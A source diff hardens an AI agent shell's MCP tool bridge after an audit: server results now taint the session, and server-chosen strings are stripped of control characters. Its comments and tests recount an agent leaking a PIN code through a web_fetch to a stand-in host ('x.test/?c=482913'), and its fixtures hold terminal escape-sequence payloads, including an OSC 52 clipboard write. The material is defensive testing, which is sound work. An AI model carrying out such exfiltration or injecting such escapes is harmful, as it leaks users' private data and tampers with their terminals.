@@ -17,10 +17,14 @@
 //!
 //! The B-permission model has three defences:
 //!
-//! - **(a) profile separation:** personal-data tools DO NOT SHARE a profile with
-//!   MCP. `Router` establishes that; the contribution here is
-//!   `MCPTool::taints_session()` returning `false` — an MCP tool is not a SOURCE of
-//!   personal data but an EXIT for it.
+//! - **(a) an MCP result is personal AND outside text:** `MCPTool::taints_session()`
+//!   and `external_content()` both return `true` (audit H2-a). The first version
+//!   said `false` — "an MCP tool is not a SOURCE of personal data but an EXIT for
+//!   it" — and was measured wrong: a remote read returned "PIN reset code
+//!   482913", the session stayed clean, and the next `web_fetch` carried the code
+//!   to `https://x.test/?c=482913` with no question asked. A server the user
+//!   connected is exactly where their mail, tickets and files live. A connection
+//!   can be made STRICTER (`always_ask`), never looser.
 //! - **(b) the approval gate on a tainted session:** in `ToolExecutor`. This file
 //!   BINDS the tools' names into that gate's `external_tools` list
 //!   (`bind_executor`). Unbound, the gate has no input — exactly the mistake of
@@ -81,6 +85,12 @@ pub struct MCPTool {
     description: String,
     schema: ArgSchema,
     client: Arc<MCPClient>,
+    /// `remote_name` as a screen may show it (audit M14). The server chose the
+    /// name, so it can carry an escape sequence; `remote_name` itself stays
+    /// byte-exact because `tools/call` has to send it back as given.
+    remote_label: String,
+    /// The connection's `always_ask` (see `ConnectionSetting::always_ask`).
+    always_ask: bool,
 }
 
 impl MCPTool {
@@ -92,14 +102,23 @@ impl MCPTool {
         schema: ArgSchema,
         client: Arc<MCPClient>,
     ) -> Self {
+        let remote_name = remote_name.into();
         Self {
             name: name.into(),
-            remote_name: remote_name.into(),
-            connection_name: connection_name.into(),
-            description: description.into(),
+            remote_label: tacet_mcp::safe_for_screen(&remote_name),
+            remote_name,
+            connection_name: one_line(&connection_name.into()),
+            description: one_line(&description.into()),
             schema,
             client,
+            always_ask: false,
         }
+    }
+
+    /// The same tool, asking before every call — the connection's `always_ask`.
+    pub fn asking_every_call(mut self, always_ask: bool) -> Self {
+        self.always_ask = always_ask;
+        self
     }
 
     pub fn remote_name(&self) -> &str {
@@ -109,6 +128,34 @@ impl MCPTool {
     pub fn connection_name(&self) -> &str {
         &self.connection_name
     }
+}
+
+/// Text from a server — or from a config file a server's docs told the user to
+/// paste — on its way to a screen, as ONE line with no control character
+/// (audit M14).
+///
+/// NOT `safe_for_screen` EVERYWHERE, because that one also cuts at 120
+/// characters, and some of these lines are ours and longer (the `chmod 600`
+/// advice is ~250). Where the far side chose the text — a tool name, a type
+/// string — the capped gate is applied to that piece first; this is the
+/// uncapped pass over the whole line that every string leaving this module
+/// gets.
+fn one_line(raw: &str) -> String {
+    raw.chars()
+        .map(|c| if c.is_control() { ' ' } else { c })
+        .collect::<String>()
+        .split_whitespace()
+        .collect::<Vec<_>>()
+        .join(" ")
+}
+
+/// `one_line` for a body that is MEANT to have lines — a tool's output shown by
+/// `tacet mcp try`. Newlines survive; every other control character (ESC, CR,
+/// the 8-bit CSI) becomes a space.
+fn screen_block(raw: &str) -> String {
+    raw.chars()
+        .map(|c| if c.is_control() && c != '\n' { ' ' } else { c })
+        .collect()
 }
 
 /// Paints a running remote task onto the chip that started it:
@@ -123,11 +170,12 @@ impl tacet_mcp::TaskWatch for ChipWatch {
     fn tick(&self, progress: &tacet_mcp::tasks::Progress) {
         self.reporter.update(
             self.trace,
+            // The task id and status are the SERVER's words (audit M14).
             TraceUpdate::default().text(format!(
                 "{} · {} · {} · {}s",
                 self.connection,
-                progress.id,
-                progress.status,
+                tacet_mcp::safe_for_screen(&progress.id),
+                tacet_mcp::safe_for_screen(&progress.status),
                 progress.elapsed.as_secs()
             )),
         );
@@ -147,16 +195,41 @@ impl Tool for MCPTool {
         self.schema.clone()
     }
 
-    /// An MCP tool DOES NOT TAINT the session.
+    /// An MCP result TAINTS the session (audit H2-a).
     ///
-    /// Taint means "personal data WAS READ off the device"; an MCP tool does not
-    /// read data, it SENDS IT OUT. Returning `true` here would close the gate on
-    /// itself: the first MCP call would taint the session and the second would ask
-    /// for approval — even though nothing was read off the device in between. That
-    /// is how approval fatigue starts, and it would kill §2.4's "an approval that
-    /// is rare gets read" principle.
+    /// This said `false`, on the argument that an MCP tool "does not read data,
+    /// it SENDS IT OUT", and that tainting would make every second MCP call ask.
+    /// The second half is true and is the price; the first half was measured
+    /// false: a remote read returned "PIN reset code 482913", the session stayed
+    /// clean, and `web_fetch https://x.test/?c=482913` ran with no question. The
+    /// servers a user connects are where their mail, tickets and files live —
+    /// the same presumption `http` makes for a host the user named, and the two
+    /// had disagreed for no reason anyone wrote down.
+    ///
+    /// NOT CONFIGURABLE. A connection can only be made stricter (`always_ask`).
     fn taints_session(&self) -> bool {
-        false
+        true
+    }
+
+    /// And its text was written by somebody else (audit H2-c): after it, the
+    /// tools that act on this machine ask before every call.
+    fn external_content(&self) -> bool {
+        true
+    }
+
+    /// The connection's `always_ask`.
+    fn always_asks(&self) -> bool {
+        self.always_ask
+    }
+
+    /// LONGER THAN THE DEFAULT, for two waits nobody here controls: a remote
+    /// task polled after its call (`tacet_mcp::tasks::DEADLINE`, on top of the
+    /// call's own `TIMEOUT_S`), and a server's question put to the user (MRTR),
+    /// which waits as long as the person takes to answer. The transport's own
+    /// timeouts end a dead server long before this; it only has to never cut off
+    /// a person typing.
+    fn deadline(&self) -> std::time::Duration {
+        std::time::Duration::from_secs(30 * 60)
     }
 
     fn run<'a>(&'a self, args: Value, ctx: &'a mut ToolContext) -> ToolFuture<'a> {
@@ -196,7 +269,11 @@ impl Tool for MCPTool {
                     // single exit point of `ToolOutcome::failed`; raw `ureq`/server
                     // text DOES NOT LEAK from here.
                     let converted = convert_error(&error);
-                    let chip = format!("{} · {}", self.connection_name, error.short_error());
+                    let chip = format!(
+                        "{} · {}",
+                        self.connection_name,
+                        one_line(&error.short_error())
+                    );
                     ctx.update_chip(
                         trace,
                         TraceUpdate::state(tacet_kernel::ToolState::Failed(chip.clone()))
@@ -225,7 +302,7 @@ impl MCPTool {
     /// §5.5 — MCP output NEVER enters the context in its raw form.
     fn process_output(&self, ctx: &ToolContext, text: String, server_error: bool) -> ToolOutcome {
         let label = if server_error { "failed" } else { "ok" };
-        let chip = format!("{} · {} {}", self.connection_name, self.remote_name, label);
+        let chip = format!("{} · {} {}", self.connection_name, self.remote_label, label);
 
         if text.trim().is_empty() {
             // Empty output DOES NOT mean "nothing happened" (a command may have
@@ -359,6 +436,28 @@ impl LoadOutcome {
         self.tools.iter().map(|t| t.name().to_string()).collect()
     }
 
+    /// Every string in the outcome as ONE screen-safe line (audit M14).
+    ///
+    /// THE LAST STEP OF EVERY PATH THAT BUILDS ONE, rather than a promise each
+    /// `push` keeps: the shell prints these on every start (`report_mcp`) with a
+    /// plain `eprintln!`, and one forgotten `format!` with a server's word in it
+    /// was the whole of the finding — `note='y\u{1b}[31mRED…'` reached the tty.
+    fn screen_safe(mut self) -> Self {
+        for note in &mut self.notes {
+            *note = one_line(note);
+        }
+        for skipped in &mut self.skipped {
+            skipped.connection = one_line(&skipped.connection);
+            skipped.remote_name = one_line(&skipped.remote_name);
+            skipped.reason = one_line(&skipped.reason);
+        }
+        for (name, error) in &mut self.connection_errors {
+            *name = one_line(name);
+            *error = one_line(error);
+        }
+        self
+    }
+
     fn merge(&mut self, other: LoadOutcome) {
         self.tools.extend(other.tools);
         self.skipped.extend(other.skipped);
@@ -380,6 +479,27 @@ pub fn load_connection_with(
     setting: &ConnectionSetting,
     asker: Arc<dyn tacet_mcp::InputAsk>,
 ) -> LoadOutcome {
+    load_connection_through(setting, asker, None)
+}
+
+/// `load_connection_with` over a transport the caller supplies — the
+/// record/replay one in tests (`tacet_mcp::transport::replay`). The same seam
+/// `MCPClient::with_transport` is; it exists so the strings a HOSTILE server
+/// can put into a `LoadOutcome` are measured on the path the shell takes, not
+/// on a copy of it.
+pub fn load_connection_over(
+    setting: &ConnectionSetting,
+    asker: Arc<dyn tacet_mcp::InputAsk>,
+    transport: Arc<dyn tacet_mcp::Transport>,
+) -> LoadOutcome {
+    load_connection_through(setting, asker, Some(transport))
+}
+
+fn load_connection_through(
+    setting: &ConnectionSetting,
+    asker: Arc<dyn tacet_mcp::InputAsk>,
+    transport: Option<Arc<dyn tacet_mcp::Transport>>,
+) -> LoadOutcome {
     let mut outcome = LoadOutcome::default();
 
     // An unrecognised `spec` is NOT guessed at silently: the connection still
@@ -396,19 +516,19 @@ pub fn load_connection_with(
     // THE TOKEN WINS OVER THE STATIC KEY. A connection configured for OAuth
     // that still carries a `key` is a leftover, and the leftover is the one
     // more likely to be stale.
-    let (key, auth_note) = resolve_key(setting);
-    if let Some(note) = auth_note {
-        outcome.notes.push(format!("{}: {note}", setting.name));
-    }
-    let client = match MCPClient::new(setting.url.clone(), key) {
-        Ok(c) => Arc::new(c.with_spec(setting.spec_choice()).with_asker(asker)),
+    let (client, auth_note) = match open_client(setting, asker, transport) {
+        Ok(opened) => opened,
         Err(e) => {
             outcome
                 .connection_errors
                 .push((setting.name.clone(), e.short_error()));
-            return outcome;
+            return outcome.screen_safe();
         }
     };
+    if let Some(note) = auth_note {
+        outcome.notes.push(format!("{}: {note}", setting.name));
+    }
+    let client = Arc::new(client);
 
     let specs = match client.tools() {
         Ok(s) => s,
@@ -416,7 +536,7 @@ pub fn load_connection_with(
             outcome
                 .connection_errors
                 .push((setting.name.clone(), e.short_error()));
-            return outcome;
+            return outcome.screen_safe();
         }
     };
 
@@ -434,16 +554,25 @@ pub fn load_connection_with(
         match convert_schema(&spec.schema) {
             Ok(conversion) => {
                 for note in &conversion.notes.0 {
-                    outcome.notes.push(format!("{}: {note}", spec.name));
+                    // Both halves are the server's: its tool name, and the
+                    // schema text the note quotes (audit M14).
+                    outcome.notes.push(format!(
+                        "{}: {}",
+                        tacet_mcp::safe_for_screen(&spec.name),
+                        tacet_mcp::safe_for_screen(note)
+                    ));
                 }
-                outcome.tools.push(Arc::new(MCPTool::new(
-                    build_tool_name(&setting.name, &spec.name),
-                    spec.name.clone(),
-                    setting.name.clone(),
-                    truncate_description(&spec.description),
-                    conversion.schema,
-                    Arc::clone(&client),
-                )) as Arc<dyn Tool>);
+                outcome.tools.push(Arc::new(
+                    MCPTool::new(
+                        build_tool_name(&setting.name, &spec.name),
+                        spec.name.clone(),
+                        setting.name.clone(),
+                        truncate_description(&spec.description),
+                        conversion.schema,
+                        Arc::clone(&client),
+                    )
+                    .asking_every_call(setting.always_ask),
+                ) as Arc<dyn Tool>);
             }
             // SILENTLY ACCEPTING SOMETHING UNCONVERTIBLE IS FORBIDDEN: a wrongly
             // narrowed schema means the grammar forces the model into a shape the
@@ -451,13 +580,38 @@ pub fn load_connection_with(
             // reason is recorded.
             Err(reason) => outcome.skipped.push(SkippedTool {
                 connection: setting.name.clone(),
-                remote_name: spec.name,
-                reason: reason.short(),
+                remote_name: tacet_mcp::safe_for_screen(&spec.name),
+                // `unsupported type: <whatever the server wrote>` — capped and
+                // stripped like any other text the far side chose.
+                reason: tacet_mcp::safe_for_screen(&reason.short()),
             }),
         }
     }
 
-    outcome
+    outcome.screen_safe()
+}
+
+/// The client a connection talks through, with the credential the CHAT path
+/// uses — the OAuth token when the connection has an `auth` block (audit L10).
+///
+/// ONE FUNCTION FOR BOTH CALLERS ON PURPOSE. `tacet mcp try` built its own
+/// client with `setting.resolved_key()`, the static key, so on a connection
+/// that logs in it went out with no token or a stale one and reported a
+/// failure the shell itself would never have hit. A diagnostic that takes a
+/// different path from the thing it diagnoses measures the wrong thing.
+fn open_client(
+    setting: &ConnectionSetting,
+    asker: Arc<dyn tacet_mcp::InputAsk>,
+    transport: Option<Arc<dyn tacet_mcp::Transport>>,
+) -> Result<(MCPClient, Option<String>), MCPError> {
+    let (key, auth_note) = resolve_key(setting);
+    let mut client = MCPClient::new(setting.url.clone(), key)?
+        .with_spec(setting.spec_choice())
+        .with_asker(asker);
+    if let Some(transport) = transport {
+        client = client.with_transport(transport);
+    }
+    Ok((client, auth_note))
 }
 
 // ---------------------------------------------------------------------------
@@ -489,7 +643,9 @@ pub fn begin_login(name: &str) -> Result<LoginStep, String> {
     let auth = setting.auth.clone().ok_or_else(|| {
         format!("{name:?} has no `auth` block in mcp.json — nothing to log in to")
     })?;
-    let started = tacet_mcp::auth::begin(&auth).map_err(|e| e.short_error())?;
+    // The connection's own URL is the RFC 8707 resource: the token is minted
+    // for this server and no other (audit L1).
+    let started = tacet_mcp::auth::begin(&auth, &setting.url).map_err(|e| e.short_error())?;
     Ok(LoginStep {
         url: started.url.clone(),
         started,
@@ -649,21 +805,47 @@ pub fn try_connection(
     asker: Arc<dyn InputAsk>,
     call: Option<(String, Value)>,
 ) -> Result<TryOutcome, String> {
+    try_connection_through(name, asker, call, None)
+}
+
+/// `try_connection` over a transport the caller supplies — the replay one in
+/// tests. Everything else is the real path: the config file, the token file,
+/// the client the shell would build.
+pub fn try_connection_over(
+    name: &str,
+    asker: Arc<dyn InputAsk>,
+    call: Option<(String, Value)>,
+    transport: Arc<dyn tacet_mcp::Transport>,
+) -> Result<TryOutcome, String> {
+    try_connection_through(name, asker, call, Some(transport))
+}
+
+fn try_connection_through(
+    name: &str,
+    asker: Arc<dyn InputAsk>,
+    call: Option<(String, Value)>,
+    transport: Option<Arc<dyn tacet_mcp::Transport>>,
+) -> Result<TryOutcome, String> {
     let (config, _exposed) =
-        tacet_mcp::config::read_default_checked().map_err(|e| e.short_error())?;
+        tacet_mcp::config::read_default_checked().map_err(|e| one_line(&e.short_error()))?;
     let setting = config
         .connections
         .iter()
         .find(|c| c.name.eq_ignore_ascii_case(name))
         .ok_or_else(|| format!("no connection named {name:?} in mcp.json"))?;
 
-    let client = MCPClient::new(setting.url.clone(), setting.resolved_key())
-        .map_err(|e| e.short_error())?
-        .with_spec(setting.spec_choice())
-        .with_asker(asker);
+    // THE CHAT PATH'S CLIENT, token and all (audit L10). When the login is
+    // missing or expired the attempt still goes out — the server's own answer
+    // is part of what `try` reports — and the reason travels with any failure.
+    let (client, auth_note) =
+        open_client(setting, asker, transport).map_err(|e| one_line(&e.short_error()))?;
+    let explain = |error: String| match &auth_note {
+        Some(note) => one_line(&format!("{error} ({note})")),
+        None => one_line(&error),
+    };
 
     let started = std::time::Instant::now();
-    let specs = client.tools().map_err(|e| e.short_error())?;
+    let specs = client.tools().map_err(|e| explain(e.short_error()))?;
     let millis = started.elapsed().as_millis();
 
     // ONE CALL, AND ONLY THE ONE THAT WAS NAMED. The draft spec asks this
@@ -676,8 +858,10 @@ pub fn try_connection(
         Some((tool, arguments)) => Some(
             client
                 .call_tool_as(&tool, &arguments, name)
-                .map(|(text, is_error)| (tool.clone(), text, is_error))
-                .map_err(|e| format!("{tool}: {}", e.short_error()))?,
+                // The output is the server's text, printed by the shell as it
+                // comes (audit M14): lines survive, escapes do not.
+                .map(|(text, is_error)| (one_line(&tool), screen_block(&text), is_error))
+                .map_err(|e| explain(format!("{tool}: {}", e.short_error())))?,
         ),
     };
 
@@ -692,7 +876,12 @@ pub fn try_connection(
         millis,
         tools: specs
             .into_iter()
-            .map(|s| (s.name, truncate_description(&s.description)))
+            .map(|s| {
+                (
+                    tacet_mcp::safe_for_screen(&s.name),
+                    one_line(&truncate_description(&s.description)),
+                )
+            })
             .collect(),
     })
 }
@@ -732,7 +921,7 @@ pub fn load_from_default_with(asker: Arc<dyn tacet_mcp::InputAsk>) -> LoadOutcom
             .connection_errors
             .push(("configuration".into(), e.short_error())),
     }
-    outcome
+    outcome.screen_safe()
 }
 
 /// Adds the loaded tools to the catalog and returns their names.
@@ -833,8 +1022,14 @@ mod tests {
         fn schema(&self) -> ArgSchema {
             ArgSchema::object(vec![Field::new("command", ArgSchema::text()).required()])
         }
+        // THE SAME ANSWERS AS `MCPTool` (audit H2-a): a fake that kept the old
+        // `false` would let these gate tests pass against a tool that no longer
+        // exists.
         fn taints_session(&self) -> bool {
-            false
+            true
+        }
+        fn external_content(&self) -> bool {
+            true
         }
         fn run<'a>(&'a self, _a: Value, _c: &'a mut ToolContext) -> ToolFuture<'a> {
             boxed(async move { ToolOutcome::read_ok("sent", "ok") })
@@ -1072,9 +1267,11 @@ mod tests {
             catalog.find("ev_run").is_some(),
             "it MUST BE VISIBLE in the catalog"
         );
-        // An MCP tool is not a SOURCE of personal data: it must not enter the
-        // tainting list.
-        assert!(catalog.tainting_tools().is_empty());
+        // THE EXPECTATION WAS INVERTED BY AUDIT H2-a. This line asserted the
+        // tainting list stayed EMPTY ("an MCP tool is not a SOURCE of personal
+        // data"), which is the behaviour the audit measured leaking a PIN code
+        // to a web fetch. An MCP tool is on the list now.
+        assert_eq!(catalog.tainting_tools(), vec!["ev_run"]);
     }
 
     /// A REMOTE NAME THAT COLLIDES WITH A BUILT-IN IS REFUSED, NOT PUSHED.
@@ -1141,6 +1338,7 @@ mod tests {
             enabled: true,
             spec: None,
             auth: None,
+            always_ask: false,
         };
         let outcome = load_connection(&setting);
         assert!(outcome.tools.is_empty());
@@ -1297,5 +1495,234 @@ mod tests {
             convert_error(&MCPError::Timeout),
             ToolError::Timeout
         ));
+    }
+
+    // --- Audit of 9 Oct 2026: H2-a (MCP taints), M14 (hostile strings) ---
+
+    use tacet_mcp::transport::replay::{Canned, ReplayTransport};
+
+    /// The REAL `MCPTool`, on a client whose transport replays `replies` — the
+    /// bridge, the client and the executor all as the shell runs them, with no
+    /// socket.
+    fn replayed_tool(remote: &str, replies: Vec<Canned>) -> (MCPTool, Arc<ReplayTransport>) {
+        let transport = Arc::new(ReplayTransport::new(replies));
+        let client = MCPClient::new("https://mail.example.com/mcp", None)
+            .expect("client")
+            .with_transport(transport.clone());
+        let tool = MCPTool::new(
+            build_tool_name("mail", remote),
+            remote,
+            "mail",
+            "Reads mail.",
+            ArgSchema::object(vec![Field::new("query", ArgSchema::text())]),
+            Arc::new(client),
+        );
+        (tool, transport)
+    }
+
+    fn call_reply(text: &str) -> Canned {
+        Canned::ok(
+            json!({"jsonrpc": "2.0", "id": 1, "result": {"content": [{"type": "text", "text": text}]}})
+                .to_string(),
+        )
+    }
+
+    /// A stand-in for `web_fetch`: an outbound tool that records whether it ran.
+    struct Outbound(Arc<std::sync::atomic::AtomicBool>);
+    impl Tool for Outbound {
+        fn name(&self) -> &str {
+            "web_fetch"
+        }
+        fn description(&self) -> &str {
+            "Fetches a page."
+        }
+        fn schema(&self) -> ArgSchema {
+            ArgSchema::object(vec![Field::new("url", ArgSchema::text()).required()])
+        }
+        fn run<'a>(&'a self, _a: Value, _c: &'a mut ToolContext) -> ToolFuture<'a> {
+            self.0.store(true, std::sync::atomic::Ordering::SeqCst);
+            boxed(async move { ToolOutcome::read_ok("fetched", "ok") })
+        }
+    }
+
+    /// THE AUDIT'S HARNESS, ON THE REAL TOOL (H2-a): an MCP read returned a PIN,
+    /// the session stayed clean, and `web_fetch https://x.test/?c=482913` ran
+    /// with no question asked.
+    #[test]
+    fn an_mcp_result_taints_the_session_and_the_next_outbound_call_asks() {
+        let (tool, _transport) =
+            replayed_tool("read_inbox", vec![call_reply("PIN reset code 482913")]);
+        let mcp_name = tool.name().to_string();
+        let fetched = Arc::new(std::sync::atomic::AtomicBool::new(false));
+        let mut catalog = ToolCatalog::new();
+        catalog.add(Arc::new(tool));
+        catalog.add(Arc::new(Outbound(Arc::clone(&fetched))));
+        let executor = bind_executor(ToolExecutor::new(catalog), std::slice::from_ref(&mcp_name))
+            .external_tool("web_fetch")
+            .with_gate(SilentDeny);
+        let mut ctx = context();
+        let ticket = executor.active_turn();
+
+        let read = wait(executor.execute(
+            &ToolCall::new(&mcp_name, json!({"query": "pin"})),
+            ticket,
+            &mut ctx,
+        ));
+        assert_eq!(read.reason, ExecutionReason::Ok, "{read:?}");
+        assert!(read.to_model.contains("482913"));
+        assert!(
+            executor.session_tainted(),
+            "a remote read is the user's data — the session must be tainted"
+        );
+        assert!(executor.saw_external_content());
+
+        let leak = wait(executor.execute(
+            &ToolCall::new("web_fetch", json!({"url": "https://x.test/?c=482913"})),
+            ticket,
+            &mut ctx,
+        ));
+        assert_eq!(leak.reason, ExecutionReason::ApprovalDenied);
+        assert!(
+            !fetched.load(std::sync::atomic::Ordering::SeqCst),
+            "the code left the machine"
+        );
+    }
+
+    /// `always_ask` turns ONE way: a connection can ask on every call, even the
+    /// first of a clean session — and nothing in the file can switch the taint
+    /// off.
+    #[test]
+    fn a_connection_can_be_made_stricter_and_never_looser() {
+        let setting: ConnectionSetting = serde_json::from_value(json!({
+            "name": "mail",
+            "url": "https://mail.example.com/mcp",
+            "always_ask": true,
+            // Not a field: there is no knob to loosen with, so it is ignored.
+            "taints_session": false,
+            "external_content": false
+        }))
+        .expect("setting");
+        let mut replies = vec![Canned::ok(
+            json!({"jsonrpc": "2.0", "id": 1, "result": {"serverInfo": {"name": "m", "version": "1"}, "capabilities": {"tools": {}}}})
+                .to_string(),
+        )];
+        replies.push(Canned::ok(
+            json!({"jsonrpc": "2.0", "id": 1, "result": {"tools": [
+                {"name": "read_inbox", "description": "Reads.", "inputSchema": {"type": "object", "properties": {}}}
+            ]}})
+            .to_string(),
+        ));
+        let loaded = load_connection_over(
+            &setting,
+            Arc::new(tacet_mcp::DeclineInput),
+            Arc::new(ReplayTransport::new(replies)),
+        );
+        assert!(
+            loaded.connection_errors.is_empty(),
+            "{:?}",
+            loaded.connection_errors
+        );
+        let tool = Arc::clone(&loaded.tools[0]);
+        assert!(tool.always_asks());
+        assert!(tool.taints_session() && tool.external_content());
+
+        let name = tool.name().to_string();
+        let catalog: ToolCatalog = [tool].into_iter().collect();
+        let executor = bind_executor(ToolExecutor::new(catalog), std::slice::from_ref(&name))
+            .with_gate(SilentDeny);
+        let mut ctx = context();
+        let first = wait(executor.execute(
+            &ToolCall::new(&name, json!({})),
+            executor.active_turn(),
+            &mut ctx,
+        ));
+        assert_eq!(
+            first.reason,
+            ExecutionReason::ApprovalDenied,
+            "always_ask asks even in a clean session"
+        );
+
+        // And the default stays quiet in a clean session.
+        let plain: ConnectionSetting =
+            serde_json::from_value(json!({"name": "mail", "url": "https://mail.example.com/mcp"}))
+                .expect("setting");
+        assert!(!plain.always_ask);
+    }
+
+    fn has_control(text: &str) -> bool {
+        text.chars().any(char::is_control)
+    }
+
+    /// M14: what a hostile server can put into the load report, measured on the
+    /// path the shell prints from every start.
+    #[test]
+    fn a_hostile_servers_names_and_types_reach_the_report_without_escapes() {
+        let setting: ConnectionSetting = serde_json::from_value(json!({
+            "name": "evil",
+            "url": "https://evil.example.com/mcp",
+            "spec": "x\u{1b}]52;c;Zm9v\u{7}"
+        }))
+        .expect("setting");
+        let replies = vec![
+            Canned::ok(
+                json!({"jsonrpc": "2.0", "id": 1, "result": {"serverInfo": {"name": "e", "version": "1"}, "capabilities": {"tools": {}}}})
+                    .to_string(),
+            ),
+            Canned::ok(
+                json!({"jsonrpc": "2.0", "id": 1, "result": {"tools": [
+                    // A dropped constraint: the note quotes the tool's name.
+                    {"name": "y\u{1b}[31mRED", "description": "d\u{1b}[2J", "inputSchema": {
+                        "type": "object",
+                        "properties": {"q": {"type": "string", "pattern": "^a"}}}},
+                    // An unconvertible type: the skip reason quotes the type.
+                    {"name": "z\u{9b}31m", "description": "d", "inputSchema": {
+                        "type": "object",
+                        "properties": {"q": {"type": "\u{1b}[5mBLINK"}}}}
+                ]}})
+                .to_string(),
+            ),
+        ];
+        let loaded = load_connection_over(
+            &setting,
+            Arc::new(tacet_mcp::DeclineInput),
+            Arc::new(ReplayTransport::new(replies)),
+        );
+        assert!(
+            loaded.connection_errors.is_empty(),
+            "{:?}",
+            loaded.connection_errors
+        );
+        assert!(!loaded.notes.is_empty(), "the fixture must produce notes");
+        assert!(
+            !loaded.skipped.is_empty(),
+            "the fixture must produce a skip"
+        );
+        for note in &loaded.notes {
+            assert!(!has_control(note), "a note carries an escape: {note:?}");
+        }
+        for skipped in &loaded.skipped {
+            for text in [&skipped.connection, &skipped.remote_name, &skipped.reason] {
+                assert!(!has_control(text), "a skip carries an escape: {text:?}");
+            }
+        }
+        for tool in &loaded.tools {
+            assert!(!has_control(tool.description()), "{:?}", tool.description());
+        }
+    }
+
+    /// The chip a hostile remote name lands on (M14): `remote_name` itself stays
+    /// byte-exact for `tools/call`, the screen gets the clean label.
+    #[test]
+    fn a_hostile_remote_name_does_not_reach_the_chip() {
+        let hostile = "run\u{1b}[2J\u{1b}[H";
+        let (tool, transport) = replayed_tool(hostile, vec![call_reply("done")]);
+        let mut ctx = context();
+        let outcome = wait(tool.run(json!({}), &mut ctx));
+        assert!(!has_control(&outcome.chip_text), "{:?}", outcome.chip_text);
+        let sent: Value = serde_json::from_slice(&transport.sent()[0].body).expect("json");
+        assert_eq!(
+            sent["params"]["name"], hostile,
+            "the call must name the tool as given"
+        );
     }
 }
